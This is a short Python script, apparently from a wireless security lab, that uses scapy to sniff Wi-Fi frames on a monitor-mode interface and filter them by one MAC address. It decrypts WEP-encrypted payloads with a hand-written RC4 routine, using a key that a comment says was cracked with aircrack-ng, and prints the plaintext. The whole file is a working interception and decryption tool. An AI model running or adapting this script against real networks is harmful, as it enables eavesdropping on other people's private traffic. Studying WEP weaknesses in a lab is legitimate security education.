from scapy.all import *
import struct
import binascii

#Decryption/encryption algorithm for the WEP data
def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + (key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1)%256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)
    return result

#This function decrypts every WEP encrypted packet, and prints it if it contains useful information
def wep_decrypt(packet):
    wep_key = bytes.fromhex("0000000000") #Found the wep_key using aircrack-ng

    #we filter if the packet contains WEP data
    if packet.haslayer(Dot11WEP):
        iv = packet[Dot11WEP].iv

        rc4_key = iv + wep_key
        encrypted_payload = packet[Dot11WEP].wepdata

        decrypted_data = rc4(rc4_key, encrypted_payload)

        data = decrypted_data
        print('DECRYPTED IF WEP; ', data, '\n')

#Filters the packets if it contains the right mac adresses
def packet_filter(packet):
    filter_mac = 'b8:27:eb:ec:7e:a0'
    if packet.haslayer(Dot11):
        return (packet.addr1 == filter_mac  or packet.addr2 == filter_mac and packet.addr3 == filter_mac)
    return False

sniff(iface = 'wlan0mon', prn = wep_decrypt, lfilter = packet_filter)
